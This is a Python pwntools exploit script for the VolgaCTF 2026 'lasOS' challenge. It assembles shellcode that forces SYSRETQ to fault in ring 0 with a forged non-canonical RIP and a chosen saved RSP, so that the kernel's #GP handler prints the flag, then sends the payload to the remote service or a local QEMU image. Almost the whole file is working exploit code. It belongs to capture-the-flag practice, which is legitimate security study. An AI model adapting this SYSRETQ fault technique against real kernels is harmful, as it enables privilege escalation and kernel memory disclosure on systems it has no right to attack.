#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re
import sys

from pwn import asm, context, process, remote


context.clear(arch="amd64")


DEFAULT_HOST = "lasos-1.q.2026.volgactf.ru"
DEFAULT_PORT = 45004

# Kernel addresses from the shipped image.
FLAG_PTR = 0xFFFFFF80000081C0

# RSP value that still gives the first #GP puts enough stack headroom, while
# placing the saved RDX slot exactly on exception_table[13] at 0x...2068.
SAVED_RSP = 0xFFFFFF8000022100

# Force SYSRETQ to #GP in ring 0.
FORGED_RIP = 0x4141414141414141
FORGED_RFLAGS = 0x202


def build_payload() -> bytes:
    # On Intel CPUs, SYSRETQ with a non-canonical RCX faults in ring 0 after
    # the kernel has already restored RSP from the saved userspace context.
    #
    # For #GP, the common handler first does:
    #   mov rsi, [rdi]
    #   mov rdi, [exception_table + rsi*8]
    #   call puts
    #
    # With SAVED_RSP = 0x...2100, the saved RDX slot from syscall 3 is written
    # onto exception_table[13]. The first puts therefore prints FLAG_PTR before
    # the handler eventually dies from its tiny stack.

    return asm(
        f"""
        sub rsp, 0x90
        cld

        xor eax, eax
        mov ecx, 18
        mov rdi, rsp
        rep stosq

        movabs rax, {FLAG_PTR}
        mov [rsp+0x18], rax

        movabs rax, {SAVED_RSP}
        mov [rsp+0x38], rax

        movabs rax, {FORGED_RIP}
        mov [rsp+0x80], rax

        movabs rax, {FORGED_RFLAGS}
        mov [rsp+0x88], rax

        mov rdi, rsp
        mov rsi, 0x90
        mov eax, 3
        syscall

    hang:
        jmp hang
        """
    )


def start_io(args: argparse.Namespace):
    if args.local:
        return process(["./start.sh"])
    if args.local_tcg:
        return process(
            [
                "qemu-system-x86_64",
                "-cpu",
                "max,+smap",
                "-drive",
                f"format=raw,file={args.image}",
                "-serial",
                "stdio",
                "-display",
                "none",
                "-no-reboot",
                "-accel",
                "tcg",
                "-monitor",
                "none",
            ]
        )
    return remote(args.host, args.port)


def exploit(args: argparse.Namespace) -> int:
    payload = build_payload()

    if args.dump_payload:
        print(f"payload length: {len(payload)}")
        print(payload.hex())
        return 0

    io = start_io(args)
    try:
        io.recvuntil(b": ")
        io.send(str(len(payload)).encode() + b"\r")
        io.recvuntil(b"bytes): ")
        io.send(payload)

        data = io.recvall(timeout=args.timeout)
    finally:
        io.close()

    match = re.search(rb"VolgaCTF\{[^}]+\}", data)
    if match:
        print(match.group().decode())
        return 0

    sys.stdout.buffer.write(data)
    return 1


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Exploit lasOS via the SYSRETQ -> #GP ring-0 fault path."
    )
    parser.add_argument("--host", default=DEFAULT_HOST, help="remote host")
    parser.add_argument("--port", default=DEFAULT_PORT, type=int, help="remote port")
    parser.add_argument(
        "--local",
        action="store_true",
        help="run against ./start.sh instead of the remote service",
    )
    parser.add_argument(
        "--local-tcg",
        action="store_true",
        help="run under qemu TCG with SMAP enabled for local syscall tracing",
    )
    parser.add_argument(
        "--image",
        default="image.bin",
        help="raw image to use with --local-tcg",
    )
    parser.add_argument(
        "--dump-payload",
        action="store_true",
        help="print the final shellcode payload and exit",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=8.0,
        help="how long to wait for the service after sending the payload",
    )
    return parser.parse_args()


def main() -> int:
    return exploit(parse_args())


if __name__ == "__main__":
    raise SystemExit(main())
